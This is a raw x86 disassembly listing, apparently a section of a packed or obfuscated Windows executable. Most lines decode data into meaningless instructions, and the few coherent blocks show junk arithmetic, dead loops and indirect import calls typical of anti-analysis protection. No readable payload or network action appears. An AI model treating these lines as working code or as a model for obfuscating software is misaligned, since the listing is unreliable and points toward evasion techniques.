  407304:	pop    ebx
  407305:	fadd   QWORD PTR [edi]
  407307:	inc    edx
  407308:	pop    esp
  407309:	stos   DWORD PTR es:[edi],eax
  40730a:	test   al,0x53
  40730c:	xchg   bl,ah
  40730e:	jl     0x40732d
  407310:	popa   
  407311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407312:	dec    ebx
  407313:	push   edx
  407314:	pusha  
  407315:	inc    esp
  407316:	push   edi
  407317:	lods   eax,DWORD PTR ds:[esi]
  407318:	sub    ebp,edx
  40731a:	mov    esp,0x5fe3b6f5
  40731f:	xchg   BYTE PTR [edi+0x31],bl
  407322:	xor    BYTE PTR [ebp+0xc],0x42
  407326:	int    0x85
  407328:	daa    
  407329:	and    BYTE PTR [ecx],dl
  40732b:	sti    
  40732c:	call   0x38c8:0x4b911949
  407333:	in     al,dx
  407334:	pop    edx
  407335:	adc    dh,BYTE PTR [edx-0x452a49fb]
  40733b:	pop    ss
  40733c:	xor    BYTE PTR [esi+esi*1+0x1c6a8439],0xae
  407344:	xor    dl,ch
  407346:	ret    
  407347:	cmp    eax,DWORD PTR [eax]
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407317
  407387:	int    0x3f
  407389:	cmp    al,0xa
  40738b:	ret    0x7e7e
  40738e:	add    eax,0x437e7e7c
  407393:	adc    ebx,DWORD PTR [ebx+0x7d]
  407396:	mov    ch,0x10
  407398:	icebp  
  407399:	cli    
  40739a:	mov    dl,0x54
  40739c:	aad    0xa6
  40739e:	icebp  
  40739f:	inc    esi
  4073a0:	push   ecx
  4073a1:	imul   ebp,DWORD PTR [ebx+0x96b9c62],0x43
  4073a8:	sub    edx,DWORD PTR [eax-0x1f]
  4073ab:	sub    ecx,DWORD PTR [esi+ecx*8+0x71269768]
  4073b2:	add    ebp,DWORD PTR [ecx]
  4073b4:	fidivr WORD PTR [eax+0x4f021619]
  4073ba:	push   cs
  4073bb:	imul   ebx,DWORD PTR [eax],0x152e24f5
  4073c1:	push   edi
  4073c2:	lods   eax,DWORD PTR ds:[esi]
  4073c3:	sub    ebp,DWORD PTR [ebx]
  4073c5:	mov    dl,0x8d
  4073c7:	push   eax
  4073c8:	xor    esp,DWORD PTR [esp+ebp*1-0x3d]
  4073cc:	bound  ecx,QWORD PTR [edi-0x5ff15424]
  4073d2:	or     BYTE PTR [edi+0x4181c297],bl
  4073d8:	aaa    
  4073d9:	sbb    DWORD PTR [ebx],ebp
  4073db:	mov    ah,0x48
  4073dd:	xor    BYTE PTR [ebp-0x1d8abc61],bh
  4073e3:	jns    0x407415
  4073e5:	arpl   WORD PTR [ecx+eiz*2+0x4c40b3bf],di
  4073ec:	fstp   TBYTE PTR [edi+0xbaa280f]
  4073f2:	sbb    BYTE PTR [eax*1+0x2f291ceb],0xba
  4073fa:	or     edi,DWORD PTR [ebx+0x69]
  4073fd:	sub    eax,DWORD PTR [ebx-0x1afb814c]
  407403:	jbe    0x407444
  407405:	inc    edi
  407406:	adc    ebx,ebx
  407408:	push   eax
  407409:	jg     0x4073aa
  40740b:	jp     0x407438
  40740d:	mov    eax,0x21ab5911
  407412:	jp     0x40742c
  407414:	test   ebp,esp
  407416:	outs   dx,DWORD PTR ds:[esi]
  407417:	dec    esi
  407418:	aaa    
  407419:	cwde   
  40741a:	out    0x67,eax
  40741c:	push   0x9b1d2a8b
  407421:	je     0x40748f
  407423:	and    edx,DWORD PTR [eax]
  407425:	xor    BYTE PTR [ebp-0x5e],0xb3
  407429:	xor    al,0xe9
  40742b:	mov    DWORD PTR [edx],edi
  40742d:	xchg   DWORD PTR [esi+0x7775d7cb],ecx
  407433:	out    0x22,eax
  407435:	fistp  WORD PTR [ecx+0x5ed66cd3]
  40743b:	push   eax
  40743c:	pusha  
  40743d:	pop    ebx
  40743e:	mov    bl,0x19
  407440:	jmp    0x407485
  407442:	pop    edx
  407443:	and    BYTE PTR [ebp+edi*1+0x6a],bh
  407447:	mov    ebx,eax
  407449:	add    BYTE PTR [eax],0x16
  40744c:	cs jns 0x407434
  40744f:	cmp    ebx,edx
  407451:	push   0x653c8bc7
  407456:	pop    esp
  407457:	jb     0x407487
  407459:	pusha  
  40745a:	test   DWORD PTR [edx],edi
  40745c:	sbb    DWORD PTR [ecx],edx
  40745e:	clc    
  40745f:	xor    DWORD PTR fs:[ecx+eax*1],ebx
  407463:	in     eax,dx
  407464:	cld    
  407465:	pop    eax
  407466:	cmovge eax,DWORD PTR [edi+0x40]
  40746a:	pop    ebx
  40746b:	fwait
  40746c:	pop    eax
  40746d:	jns    0x407448
  40746f:	clc    
  407470:	(bad)  
  407471:	pop    esi
  407472:	mov    ds:0xf7fe1f2f,eax
  407477:	pop    ebx
  407478:	and    cl,BYTE PTR [esi+0x13]
  40747b:	dec    DWORD PTR [edx+0x42fce0e3]
  407481:	mov    bl,0xf
  407483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407484:	inc    ebp
  407485:	jmp    0x80c74ad1
  40748a:	call   0xd6312e1e
  40748f:	js     0x4074f8
  407491:	cli    
  407492:	xchg   esp,eax
  407493:	retf   
  407494:	inc    ebx
  407495:	ror    BYTE PTR [eax-0x58],1
  407498:	adc    dl,BYTE PTR [ecx]
  40749a:	adc    DWORD PTR [bp+di+0x514],edi
  40749f:	imul   ecx,ebx,0x598dbc2
  4074a5:	pop    es
  4074a6:	inc    esi
  4074a7:	or     eax,0xcfe98aca
  4074ac:	adc    DWORD PTR [ecx-0x11cb0e94],eax
  4074b2:	push   cs
  4074b3:	xchg   ecx,eax
  4074b4:	jl     0x407523
  4074b6:	out    0x1e,eax
  4074b8:	mov    ebx,0x8cee817c
  4074bd:	sbb    DWORD PTR [ebp-0x7e89a57b],edx
  4074c3:	inc    ecx
  4074c4:	shl    dh,0x58
  4074c7:	add    BYTE PTR [edi+0x4ff1d53],bl
  4074cd:	inc    esp
  4074ce:	clc    
  4074cf:	xchg   esp,edi
  4074d1:	jae    0x4074e0
  4074d3:	and    dl,BYTE PTR [ecx+0x79d3176e]
  4074d9:	mov    dl,0xe4
  4074db:	sbb    eax,0x94e9da95
  4074e0:	nop
  4074e1:	fdivr  QWORD PTR [edx+0x4a]
  4074e4:	or     eax,0xb48b64e7
  4074e9:	in     al,0xe2
  4074eb:	xor    esi,DWORD PTR [ecx]
  4074ed:	sub    DWORD PTR [esi-0x33410422],edx
  4074f3:	fcomi  st,st(7)
  4074f5:	shl    DWORD PTR cs:[edi+ebp*8-0x75],1
  4074fa:	int    0x92
  4074fc:	cmp    dl,BYTE PTR [eax-0x72]
  4074ff:	dec    esp
  407500:	xor    bh,0xa4
  407503:	xchg   edi,eax
  407504:	jle    0x407562
  407506:	ss adc bl,bh
  407509:	jbe    0x407526
  40750b:	int    0x63
  40750d:	mov    esi,0x26f3f49e
  407512:	cmp    eax,ebx
  407514:	out    dx,eax
  407515:	aam    0x35
  407517:	scas   eax,DWORD PTR es:[edi]
  407518:	pop    ecx
  407519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40751a:	dec    ebp
  40751b:	xchg   DWORD PTR [edx+0x7],edi
  40751e:	nop
  40751f:	push   ebp
  407520:	test   dl,dl
  407522:	ins    BYTE PTR es:[edi],dx
  407523:	dec    ebp
  407524:	push   es
  407525:	pop    esp
  407526:	out    0x9d,al
  407528:	inc    eax
  407529:	ror    BYTE PTR [eax+0x3768ceef],cl
  40752f:	jle    0x407564
  407531:	adc    eax,0x34ce1cd6
  407536:	xchg   ecx,eax
  407537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407538:	inc    ecx
  407539:	add    DWORD PTR [eax-0x1cf787c4],eax
  40753f:	je     0x40758f
  407541:	jl     0x407529
  407543:	pop    ds
  407544:	fadd   DWORD PTR [ebx+edi*1-0x30adfd78]
  40754b:	sar    esi,1
  40754d:	mov    eax,ds:0xae42a4a9
  407552:	int3   
  407553:	push   ebp
  407554:	cmp    dl,dh
  407556:	pop    edi
  407557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407558:	popa   
  407559:	mov    edx,DWORD PTR [ecx-0xf6b5d49]
  40755f:	ins    DWORD PTR es:[edi],dx
  407560:	cmc    
  407561:	mov    bh,0x8e
  407563:	ror    DWORD PTR [esi],0x9
  407566:	inc    eax
  407567:	sub    al,0x41
  407569:	fsubp  st(6),st
  40756b:	or     ch,BYTE PTR [ecx+0x1f2112f1]
  407571:	xor    al,0xd6
  407573:	jg     0x4075dd
  407575:	aam    0xee
  407577:	fisub  DWORD PTR [ebp-0x7a]
  40757a:	jae    0x407506
  40757c:	mov    ecx,0x8bbb30d5
  407581:	push   edi
  407582:	(bad)  
  407583:	ss test eax,0x3bf18f74
  407589:	inc    ebx
  40758a:	sbb    al,0x91
  40758c:	aas    
  40758d:	retf   
  40758e:	and    DWORD PTR [ebx+0x36],esi
  407591:	and    cl,0x43
  407594:	or     esp,DWORD PTR [edi+0x79f611f2]
  40759a:	push   0x66
  40759c:	out    0xc7,eax
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	dec    eax
  407656:	pop    es
  407657:	and    BYTE PTR [ecx+edx*1+0x57e7ec0],0x7c
  40765f:	jle    0x4076df
  407661:	mov    ds:0x70e9b68,al
  407666:	dec    ebp
  407667:	dec    esi
  407668:	xor    ecx,edx
  40766a:	in     eax,dx
  40766b:	out    0x2a,eax
  40766d:	popa   
  40766e:	xchg   ebx,eax
  40766f:	lock mov dl,0xc1
  407672:	xchg   esi,eax
  407673:	adc    DWORD PTR [esi],esp
  407675:	imul   esi,DWORD PTR [ebp+0x338e2c3f],0x2e9710b5
  40767f:	(bad)  
  407680:	sar    esi,0x9f
  407683:	pop    es
  407684:	mov    edx,0xd794e41b
  407689:	inc    esp
  40768a:	pushf  
  40768b:	inc    eax
  40768c:	or     ecx,DWORD PTR [ebx-0x61]
  40768f:	xor    DWORD PTR [ecx+0x68],ecx
  407692:	pushf  
  407693:	push   esi
  407694:	fisttp WORD PTR [edx]
  407696:	cmc    
  407697:	sbb    BYTE PTR [ecx+0x781745e9],bl
  40769d:	jp     0x4076c5
  40769f:	aas    
  4076a0:	jb     0x407703
  4076a2:	inc    esp
  4076a3:	and    BYTE PTR [edi-0x66],dh
  4076a6:	out    0xbb,eax
  4076a8:	cmp    ebx,DWORD PTR ds:0x64b4488f
  4076ae:	fisttp WORD PTR [ebx+0x6e]
  4076b1:	mov    edi,0xb1624d1c
  4076b6:	xlat   BYTE PTR ds:[ebx]
  4076b7:	scas   al,BYTE PTR es:[edi]
  4076b8:	xor    al,0x2
  4076ba:	cmc    
  4076bb:	test   DWORD PTR [edx],ebx
  4076bd:	cwde   
  4076be:	jecxz  0x40769c
  4076c0:	stc    
  4076c1:	sahf   
  4076c2:	in     al,0x69
  4076c4:	ss jae 0x4076b5
  4076c7:	in     al,dx
  4076c8:	rol    dh,1
  4076ca:	jg     0x4076a6
  4076cc:	pop    esi
  4076cd:	mov    ebp,0x930bc04b
  4076d2:	mov    esp,0x8ead034c
  4076d7:	(bad)  
  4076d8:	ss push 0x4b3c76c8
  4076de:	and    ah,BYTE PTR [edi]
  4076e0:	mov    cl,0x32
  4076e2:	xlat   BYTE PTR ds:[ebx]
  4076e3:	icebp  
  4076e4:	xchg   ecx,eax
  4076e5:	push   cs
  4076e6:	cmp    dh,cl
  4076e8:	mov    bh,0x8c
  4076ea:	inc    esi
  4076eb:	dec    ecx
  4076ec:	sbb    eax,0xe1b6cf79
  4076f1:	mov    bh,0x10
  4076f3:	pushf  
  4076f4:	xor    eax,0xb69867ab
  4076f9:	and    BYTE PTR [ebp+0x48],bl
  4076fc:	cs (bad) 
  4076fe:	xchg   edi,eax
  4076ff:	outs   dx,DWORD PTR ds:[esi]
  407700:	add    eax,edi
  407702:	sbb    dh,BYTE PTR [ebx]
  407704:	jmp    0xf3397ce3
  407709:	fwait
  40770a:	mov    eax,0xf25b31bd
  40770f:	shl    BYTE PTR [eax],1
  407711:	lea    esi,[ebp-0x73]
  407714:	mov    ebp,0x2fc57e50
  407719:	xchg   edx,eax
  40771a:	pop    ds
  40771b:	sub    DWORD PTR [eax+0x7e697382],eax
  407721:	adc    esi,DWORD PTR [edx-0x65572c60]
  407727:	xor    al,0x21
  407729:	rcl    DWORD PTR [eax-0x36a726d8],0x2d
  407730:	push   0x44e003ef
  407735:	test   al,0x4c
  407737:	arpl   WORD PTR [eax+ebx*8],bx
  40773a:	lahf   
  40773b:	push   0xea9d5741
  407740:	xchg   ecx,eax
  407741:	xchg   edi,eax
  407742:	ins    BYTE PTR es:[edi],dx
  407743:	xchg   ecx,eax
  407744:	sub    BYTE PTR [ebx],ah
  407746:	in     al,0xc6
  407748:	in     eax,0xec
  40774a:	ret    
  40774b:	sbb    eax,DWORD PTR [ebx+0x13]
  40774e:	test   ch,ch
  407750:	scas   al,BYTE PTR es:[edi]
  407751:	and    eax,0xc20059a1
  407756:	aam    0x27
  407758:	nop
  407759:	jmp    DWORD PTR [ebx+0x39]
  40775c:	mov    db0,esi
  40775f:	lock test al,0xcf
  407762:	xchg   edi,eax
  407763:	sub    ecx,DWORD PTR [ebx+0x720fc0d0]
  407769:	pop    edi
  40776a:	outs   dx,DWORD PTR ds:[esi]
  40776b:	inc    ecx
  40776c:	xchg   esi,eax
  40776d:	aaa    
  40776e:	sbb    eax,0x6ed44bce
  407773:	aaa    
  407774:	add    dl,BYTE PTR [ecx-0x24]
  407777:	nop
  407778:	sub    ecx,DWORD PTR [ebp+0x576e90b0]
  40777e:	push   es
  40777f:	inc    edi
  407780:	icebp  
  407781:	xchg   DWORD PTR [edi+0x57],ebx
  407784:	ins    DWORD PTR es:[edi],dx
  407785:	mov    esp,DWORD PTR [ebx+eiz*1]
  407788:	je     0x407766
  40778a:	(bad)  
  40778b:	mov    al,0xad
  40778d:	jle    0x40773b
  40778f:	jl     0x407807
  407791:	jmp    0x7779:0x78945f92
  407798:	mov    esp,ecx
  40779a:	mov    eax,ds:0x893d5589
  40779f:	mov    cl,0x60
  4077a1:	std    
  4077a2:	add    BYTE PTR [ebp-0x43],0x47
  4077a6:	sbb    ch,ch
  4077a8:	mov    ds:0x201a15f6,al
  4077ad:	shr    DWORD PTR [edx+0x6],0x40
  4077b1:	mov    cl,0x40
  4077b3:	push   eax
  4077b4:	xor    ebp,DWORD PTR [edi]
  4077b6:	mov    ds:0x50aadca8,eax
  4077bb:	popf   
  4077bc:	push   edi
  4077bd:	mov    ds:0x32cf739,al
  4077c2:	jns    0x407757
  4077c4:	xlat   BYTE PTR ds:[ebx]
  4077c5:	jne    0x407821
  4077c7:	test   eax,0x1c1234dd
  4077cc:	dec    esp
  4077cd:	lods   eax,DWORD PTR ds:[esi]
  4077ce:	jbe    0x407796
  4077d0:	test   eax,0xd19e7f69
  4077d5:	shl    DWORD PTR [ecx-0x4a81f98c],0x3c
  4077dc:	jp     0x407822
  4077de:	stc    
  4077df:	imul   eax,DWORD PTR ds:0x4f2bf66a,0x3e
  4077e6:	retf   
  4077e7:	xchg   ebx,eax
  4077e8:	ja     0x4077f0
  4077ea:	jle    0x4077e2
  4077ec:	je     0x407829
  4077ee:	retf   
  4077ef:	shl    eax,cl
  4077f1:	sub    al,0x5f
  4077f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077f4:	fs gs cs cli 
  4077f8:	in     eax,0x18
  4077fa:	pop    esi
  4077fb:	mov    ah,0x68
  4077fd:	loopne 0x407832
  4077ff:	jns    0x40783f
  407801:	sbb    eax,DWORD PTR [eax]
  407803:	jne    0x407832
  407805:	add    cl,BYTE PTR [esi]
  407807:	lods   al,BYTE PTR cs:[esi]
  407809:	outs   dx,BYTE PTR ds:[esi]
  40780a:	das    
  40780b:	jmp    0x4077b7
  40780d:	xor    esi,DWORD PTR [ebp+0x6]
  407810:	stc    
  407811:	std    
  407812:	adc    eax,0xffccb79c
  407817:	dec    ebp
  407818:	shl    BYTE PTR [ecx],0x25
  40781b:	mov    esp,0x849dff21
  407820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407821:	mov    ebp,0x8c7a720a
  407826:	sbb    dl,bl
  407828:	mov    edx,0x7728f7a6
  40782d:	in     eax,0x32
  40782f:	aam    0xdf
  407831:	stos   BYTE PTR es:[edi],al
  407832:	mov    cl,dl
  407834:	je     0x407819
  407836:	pushf  
  407837:	cmp    bh,BYTE PTR [esi+0x28806a35]
  40783d:	imul   esp,DWORD PTR [edi+edi*8+0x1a],0x53adb626
  407845:	pusha  
  407846:	out    0x16,al
  407848:	data16 jmp 0x40784e
  40784b:	cmp    BYTE PTR [esi],ah
  40784d:	(bad)  
  40784e:	stc    
  40784f:	mov    dh,0x88
  407851:	mov    ch,0x94
  407853:	and    al,0x40
  407855:	push   esi
  407856:	xchg   ebp,eax
  407857:	pop    ss
  407858:	mov    ecx,0xa39f4662
  40785d:	int3   
  40785e:	jle    0x6ed3e331
  407864:	inc    eax
  407865:	imul   edx,DWORD PTR [eiz*2+0x3f6d12d2],0x57ce2b56
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x3d,eax
  407922:	int    0x50
  407924:	xchg   esp,eax
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x77e7e7c
  40792e:	pop    ebx
  40792f:	add    dh,BYTE PTR [eax]
  407931:	repnz data16 adc BYTE PTR ds:0xc9b02669,cl
  407939:	mov    dl,BYTE PTR [edi+esi*8]
  40793c:	xor    esp,eax
  40793e:	mov    dh,BYTE PTR [eax+0x6f1d9f9c]
  407944:	pop    edi
  407945:	inc    esi
  407946:	test   DWORD PTR [ebp-0x199c561f],eax
  40794c:	mov    edi,0xc02c724f
  407951:	push   eax
  407952:	repnz cld 
  407954:	and    eax,eax
  407956:	retf   0x8e1e
  407959:	sbb    bh,BYTE PTR [eax-0x4b84996d]
  40795f:	jnp    0x407964
  407961:	pop    edx
  407962:	xor    BYTE PTR [eax],ah
  407964:	ret    0xed10
  407967:	cmp    edi,DWORD PTR [eax-0x13]
  40796a:	mov    ebx,0xe7c3d873
  40796f:	mov    ?,WORD PTR [ebp-0x3f8a0c9]
  407975:	call   0xcb16:0xcd3de976
  40797c:	loope  0x4079a4
  40797e:	add    DWORD PTR [edi+0x37],eax
  407981:	std    
  407982:	xlat   BYTE PTR ds:[ebx]
  407983:	xchg   BYTE PTR fs:[edx-0x5265e29f],bl
  40798a:	int3   
  40798b:	scas   al,BYTE PTR es:[edi]
  40798c:	les    esp,FWORD PTR [ebx]
  40798e:	add    DWORD PTR [edx+0x39],0xffffffc8
  407992:	scas   eax,DWORD PTR es:[edi]
  407993:	sub    BYTE PTR [esi+0x6d],dh
  407996:	cmp    eax,0x680a5947
  40799b:	sub    dl,BYTE PTR [ebx-0x19]
  40799e:	jl     0x40792f
  4079a0:	retf   0xf727
  4079a3:	xor    bh,BYTE PTR [eax]
  4079a5:	das    
  4079a6:	lock sub dl,0x71
  4079aa:	add    dl,BYTE PTR [edi+eiz*4]
  4079ad:	leave  
  4079ae:	and    BYTE PTR ds:0xd81c8812,al
  4079b4:	inc    ebp
  4079b5:	xor    esi,DWORD PTR [ebx-0x2ae1f960]
  4079bb:	jnp    0x40799d
  4079bd:	mov    cl,BYTE PTR [ebx-0x5e]
  4079c0:	test   DWORD PTR [eax+0x5],ebx
  4079c3:	into   
  4079c4:	ja     0x4079ab
  4079c6:	sbb    eax,0xcaf6f1c7
  4079cb:	sbb    eax,esi
  4079cd:	sti    
  4079ce:	jo     0x4079e8
  4079d0:	sbb    al,0x64
  4079d2:	mov    ch,0xbf
  4079d4:	cdq    
  4079d5:	cwde   
  4079d6:	ja     0x407a47
  4079d8:	or     cl,BYTE PTR [eax]
  4079da:	inc    edx
  4079db:	stos   DWORD PTR es:[edi],eax
  4079dc:	add    al,0x2e
  4079de:	adc    esp,esi
  4079e0:	stos   BYTE PTR es:[edi],al
  4079e1:	add    BYTE PTR [eax],ch
  4079e3:	sbb    eax,0xc06abe00
  4079e8:	sub    al,0xc1
  4079ea:	sbb    edi,DWORD PTR [ebp-0x402a70c9]
  4079f0:	sbb    dh,BYTE PTR [edi+0x7a]
  4079f3:	test   BYTE PTR [ecx+0x1eb3c06e],bl
  4079f9:	cwde   
  4079fa:	jmp    0x4079e4
  4079fc:	adc    eax,DWORD PTR [edx-0x1ee35455]
  407a02:	sbb    bl,BYTE PTR [eax-0xdf8ca23]
  407a08:	ja     0x407a2c
  407a0a:	inc    eax
  407a0b:	or     bh,cl
  407a0d:	sbb    BYTE PTR [ebx],bl
  407a0f:	push   ds
  407a10:	xor    al,bl
  407a12:	push   eax
  407a13:	jb     0x4079f3
  407a15:	outs   dx,BYTE PTR ds:[esi]
  407a16:	out    dx,al
  407a17:	fs add edx,ebp
  407a1a:	or     DWORD PTR [ecx+0x6ae29c2],edi
  407a20:	sbb    al,0xe7
  407a22:	fldenv [ecx]
  407a24:	shl    edi,1
  407a26:	ds xor eax,0x15dd59eb
  407a2c:	pop    esp
  407a2d:	scas   eax,DWORD PTR es:[edi]
  407a2e:	push   edi
  407a2f:	cmp    al,0x64
  407a31:	aam    0x6
  407a33:	dec    eax
  407a34:	(bad)  
  407a35:	fmul   st(0),st
  407a37:	cs retf 
  407a39:	clc    
  407a3a:	jge    0x407a63
  407a3c:	xor    BYTE PTR [ecx+0x1f],0x81
  407a40:	xchg   edi,eax
  407a41:	jno    0x407aab
  407a43:	and    BYTE PTR [edi],ch
  407a45:	and    DWORD PTR [edx-0x7402087],eax
  407a4b:	mov    bh,0x32
  407a4d:	cwde   
  407a4e:	mov    ch,0x4d
  407a50:	jmp    DWORD PTR [ebp+0x64175fde]
  407a56:	int    0xdd
  407a58:	and    al,0xc9
  407a5a:	xor    DWORD PTR [eax+0x6149cd0b],edx
  407a60:	shl    BYTE PTR [ecx],0x25
  407a63:	test   BYTE PTR [ecx+0x35712cb7],dl
  407a69:	in     al,dx
  407a6a:	outs   dx,BYTE PTR ds:[esi]
  407a6b:	mov    ds:0x2ffd1747,eax
  407a70:	push   0x8
  407a72:	loopne 0x407aef
  407a74:	rcl    BYTE PTR [ebp+0x2],cl
  407a77:	loop   0x407abc
  407a79:	nop
  407a7a:	mov    eax,0x425022cb
  407a7f:	mov    WORD PTR [ebp+0x3e5abebb],cs
  407a85:	xor    BYTE PTR [ebx+0x31a173e1],0xbc
  407a8c:	cmc    
  407a8d:	add    DWORD PTR [ebx+0x50],ebp
  407a90:	mov    ebx,0x1a070e48
  407a95:	sbb    eax,0x4b2d57da
  407a9a:	aas    
  407a9b:	cmp    ebx,ebx
  407a9d:	int    0xb7
  407a9f:	in     eax,0x65
  407aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aa2:	sti    
  407aa3:	or     ebp,DWORD PTR [eax+0x5]
  407aa6:	pusha  
  407aa7:	fild   DWORD PTR [eax+0x3]
  407aaa:	rol    BYTE PTR [eax+eax*2],0xe4
  407aae:	ror    DWORD PTR [ebx],cl
  407ab0:	cmc    
  407ab1:	cmp    DWORD PTR [ecx+0x7f],esi
  407ab4:	pcmpgtd mm3,QWORD PTR [edi-0x64792c62]
  407abb:	xchg   esp,eax
  407abc:	retf   
  407abd:	pushf  
  407abe:	add    eax,edx
  407ac0:	icebp  
  407ac1:	adc    BYTE PTR [eax],dl
  407ac3:	sub    BYTE PTR [edi],dh
  407ac5:	dec    ecx
  407ac6:	out    dx,al
  407ac7:	push   edx
  407ac8:	push   eax
  407ac9:	dec    ecx
  407aca:	test   bh,0x28
  407acd:	(bad)  
  407ace:	in     eax,0x49
  407ad0:	push   esp
  407ad1:	add    cl,BYTE PTR [edi-0x34ca20ec]
  407ad7:	pop    edi
  407ad8:	push   cs
  407ad9:	push   gs
  407adb:	fcomp  QWORD PTR [ebp-0x1e]
  407ade:	jg     0x407aaa
  407ae0:	sbb    DWORD PTR [ebx],edx
  407ae2:	mov    es:0x895564aa,eax
  407ae8:	jo     0x407b02
  407aea:	pop    ds
  407aeb:	loopne 0x407b30
  407aed:	jp     0x407a9a
  407aef:	pushf  
  407af0:	xor    BYTE PTR [edx],al
  407af2:	jno    0x407a89
  407af4:	out    0x96,eax
  407af6:	mov    BYTE PTR [ebx-0x554faa4b],al
  407afc:	and    al,0x6a
  407afe:	dec    esi
  407aff:	ds dec edi
  407b01:	dec    edi
  407b02:	shl    DWORD PTR [edx+esi*1-0x3e],cl
  407b06:	loopne 0x407b70
  407b08:	mov    ebx,0x5208e992
  407b0d:	cmp    eax,0x1a312dc0
  407b12:	jnp    0x407ad8
  407b14:	stc    
  407b15:	in     eax,dx
  407b16:	and    al,0xee
  407b18:	scas   al,BYTE PTR es:[edi]
  407b19:	or     ebx,DWORD PTR [esi-0x3b9aa9f4]
  407b1f:	ins    BYTE PTR es:[edi],dx
  407b20:	test   eax,0xf60d48f4
  407b25:	adc    dh,bl
  407b27:	fnstenv [esi]
  407b29:	rcl    BYTE PTR [edi+0x6],0xe9
  407b2d:	imul   edx
  407b2f:	push   esi
  407b30:	test   al,0x85
  407b32:	ror    DWORD PTR [edx-0x68bb7515],cl
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4337ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
